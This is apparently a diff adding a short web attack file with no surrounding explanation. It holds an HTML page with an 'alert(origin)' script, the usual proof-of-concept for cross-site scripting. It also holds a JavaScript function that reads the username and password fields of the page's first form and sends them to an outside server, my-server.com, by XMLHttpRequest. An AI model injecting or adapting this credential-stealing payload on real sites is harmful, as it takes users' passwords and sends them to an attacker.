@@ -1,0 +1,18 @@
+<html>
+<body>
+<script>
+alert(origin)
+</script>
+</body>
+</html>
+
+
+function intercept() {
+    var user = document.forms[0].elements[0].value;
+    var pass = document.forms[0].elements[1].value;
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "https://my-server.com?username="+user+"&password="+pass);
+    xhr.send();
+    return false;
+}
+document.forms[0].onclick = intercept;
